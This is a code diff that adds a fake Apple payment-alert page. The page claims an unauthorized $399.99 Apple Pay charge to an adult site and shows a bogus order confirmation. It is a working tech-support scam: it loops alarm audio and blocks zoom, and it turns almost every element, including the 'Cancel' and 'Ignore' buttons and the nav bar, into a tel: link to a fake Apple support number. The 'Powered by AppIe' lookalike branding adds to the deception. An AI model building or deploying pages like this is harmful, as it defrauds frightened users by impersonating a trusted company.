+function startDueLoop() {
+    if (dueLoopRunning) return;
+    dueLoopRunning = true;
+    playDue();
+}
+
+function playDue() {
+    try { due.currentTime = 0; } catch (e) {}
+    due.play().catch(() => {});
+
+    due.onended = () => {
+        setTimeout(playDue, DUE_TO_DUE_GAP);
+    };
+}
+
+// Fallback: if autoplay was blocked, kick off on first user click
+document.addEventListener("click", () => {
+    audio.play().catch(() => {});
+    startDueLoop();
+}, { once: true });
+</script>
+
+<!-- ============ NEW POPUP ============ -->
+<div class="popup-overlay" id="paymentPopup">
+
+    <div class="ps-popup" role="dialog" aria-modal="true">
+
+      <div class="popup-header">
+        <div class="brand-icon">
+          <img src="3553gg3h.png" alt="Apple Pay">
+        </div>
+
+        <h2>Payment Security Alert</h2>
+        <p>Unusual transaction detected</p>
+      </div>
+
+      <div class="popup-body">
+
+        <p>
+          A potentially unauthorized payment was reported
+          in connection with this payment account.
+        </p>
+
+        <div class="transaction-box">
+
+          <div class="transaction-row">
+            <span>Merchant</span>
+            <span>PornHub</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Payment Method</span>
+            <span>Apple Pay</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Amount</span>
+            <span class="amount">$399.99</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Transaction ID</span>
+            <span>APX-728491</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Status</span>
+            <span class="status">Completed</span>
+          </div>
+
+        </div>
+
+        <div class="notice">
+          <strong>Important:</strong>
+          <span>If You believe this transaction is unauthorized,</span>
+          <span>Please contact Apple Support at <strong data-phone-display>+1(855) 397-2122</strong></span>
+        </div>
+
+        <div class="buttons">
+          <button class="primary-btn" data-phone-tel>
+            Call Now
+          </button>
+
+          <button class="secondary-btn" data-phone-tel>
+            Cancel
+          </button>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+<!-- ============ END NEW POPUP ============ -->
+
+<nav class="apple-nav" data-phone-tel style="cursor:pointer;">
+  <div class="nav-left">
+    <img src="lseen2.webp" alt="Menu" style="width:18px;height:auto;display:block;">
+    <img src="ee8e63hh.webp" alt="Apple Logo" style="width:18px;height:auto;display:block;position:relative;top:-3px;">
+    <span class="nav-title">Store</span>
+  </div>
+
+  <div class="nav-cart">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+      <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+      <line x1="3" y1="6" x2="21" y2="6" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round"/>
+      <path d="M16 10a4 4 0 01-8 0" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+</nav>
+
+<!-- Processing Screen -->
+<div id="processing">
+  <img src="3553gg3h.png" alt="Apple Logo" 
+       style="width:90px;height:auto;display:block;margin:0 auto 12px;">
+       
+  <p style="font-size:16px;color:#6e6e73;margin:0;">Powered by AppIe</p>
+  <p style="font-size:26px;font-weight:700;color:#1d1d1f;margin:4px 0 0;">Processing your order...</p>
+  <p style="font-size:16px;color:#6e6e73;margin:4px 0 0;">Please wait a moment</p>
+  
+  <div class="spinner"></div>
+</div>
+
+<!-- Confirmed Screen -->
+<div id="confirmed">
+
+  <div class="card">
+    <div class="card-header">
+      <div class="check-ring">
+        <svg width="24" height="24" viewBox="0 0 28 28" fill="none">
+          <polyline points="6,15 11,20 22,9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1 style="font-size:clamp(17px,5vw,22px);font-weight:700;color:#1d1d1f;margin:0 0 2px;letter-spacing:-0.5px;">Order confirmed</h1>
+      <p style="font-size:clamp(11px,3vw,13px);color:#6e6e73;letter-spacing:-0.1px;">Thank you for your purchase</p>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="progress-wrap">
+      <div class="step">
+        <div class="dot done">✓</div>
+        <span class="step-lbl done">Placed</span>
+      </div>
+      <div class="step-line done"></div>
+      <div class="step">
+        <div class="dot active" style="font-size:clamp(13px,3.5vw,16px);">···</div>
+        <span class="step-lbl active">Preparing</span>
+      </div>
+      <div class="step-line pending"></div>
+      <div class="step">
+        <div class="dot pending">○</div>
+        <span class="step-lbl pending">Ready</span>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Order</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-id">#EB-000000</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Date</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-date">—</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Item</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Store</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Amount</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">$399.99</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Payment mode</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Wallet</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Status (Paid)</span>
+      <span style="font-size:clamp(16px,2.8vw,12px);font-weight:500;color:#fff;background:#0071e3;padding:3px 10px;border-radius:20px;">Preparing</span>
+    </div>
+  </div>
+
+  <p class="sub-text">Pre-authorized transaction. No further action needed.</p>
+
+  <div class="alert-card">
+    <p style="font-size:clamp(16px,3vw,13px);color:#3a3000;line-height:1.55;margin:0 0 0;letter-spacing:-0.1px;">
+      ⚠ This amount will appear in your payment history within 24 hours.
+      If you did not place this order, please call support immediately.
+    </p>
+    <a class="btn-call" data-phone-tel>Call support: <span data-phone-display>+1(855) 397-2122</span></a>
+    <a class="btn-ignore" data-phone-tel>Ignore</a>
+  </div>
+
+</div>
+<canvas id="confetti"></canvas>	
+<script>
+  function generateOrderId() {
+    return '#EB-' + Math.floor(100000 + Math.random() * 900000);
+  }
+  function formatDate(d) {
+    var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    var h = d.getHours(), m = d.getMinutes(), ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12 || 12;
+    return months[d.getMonth()] + ' ' + d.getDate() + ', ' + d.getFullYear() + ' ' +
+           h + ':' + (m < 10 ? '0'+m : m) + ' ' + ampm;
+  }
+  function launchConfetti() {
+    var canvas = document.getElementById('confetti');
+    var ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    var colors = ['#0071e3','#34c759','#ff9f0a','#ff375f','#bf5af2','#1d1d1f'];
+    var pieces = Array.from({length: 110}, function() {
+      return {
+        x: Math.random() * canvas.width,
+        y: -10 - Math.random() * 150,
+        w: 5 + Math.random() * 7,
+        h: 9 + Math.random() * 5,
+        color: colors[Math.floor(Math.random() * colors.length)],
+        rot: Math.random() * 360,
+        speed: 2.5 + Math.random() * 3,
+        drift: (Math.random() - 0.5) * 1.5,
+        spin: (Math.random() - 0.5) * 5
+      };
+    });
+    var frame = 0;
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      pieces.forEach(function(p) {
+        ctx.save();
+        ctx.translate(p.x, p.y);
+        ctx.rotate(p.rot * Math.PI / 180);
+        ctx.fillStyle = p.color;
+        ctx.globalAlpha = 0.88;
+        ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+        ctx.restore();
+        p.y += p.speed; p.x += p.drift; p.rot += p.spin;
+      });
+      frame++;
+      if (frame < 200) requestAnimationFrame(draw);
+      else ctx.clearRect(0, 0, canvas.width, canvas.height);
+    }
+    draw();
+  }
+  setTimeout(function() {
+    document.getElementById('processing').style.display = 'none';
+    var c = document.getElementById('confirmed');
+    c.style.display = 'flex';
+    document.getElementById('order-id').textContent = generateOrderId();
+    document.getElementById('order-date').textContent = formatDate(new Date());
+    launchConfetti();
+  }, 2000);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>    
+
+<script>
+function closePopup() {
+    document.getElementById("paymentPopup").style.display = "none";
+}
+
+document.getElementById("paymentPopup").addEventListener(
+    "click",
+    function (event) {
+        if (event.target === this) {
+            closePopup();
+        }
+    }
+);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>
+
+<!-- ============================================================= -->
+<!-- 🔧 AUTO-INJECT: appliesthe phone number to all tagged elements -->
+<!-- ============================================================= -->
+<script>
+(function() {
+  var cfg = window.SUPPORT_PHONE;
+
+  // 1) Update every element that shows the number as text
+  document.querySelectorAll('[data-phone-display]').forEach(function(el) {
+    el.textContent = cfg.display;
+  });
+
+  // 2) Update every element that should become a tel: link
+  document.querySelectorAll('[data-phone-tel]').forEach(function(el) {
+    // If it's a button → add click handler
+    if (el.tagName === 'BUTTON') {
+      el.addEventListener('click', function() {
+        window.location.href = 'tel:' + cfg.tel;
+      });
+    } else {
+      // If it's an <a> or anything else → set href
+      el.setAttribute('href', 'tel:' + cfg.tel);
+    }
+  });
 })();
 </script>
-<!--End of Tawk.to Script-->
 </body>
+
 </html>
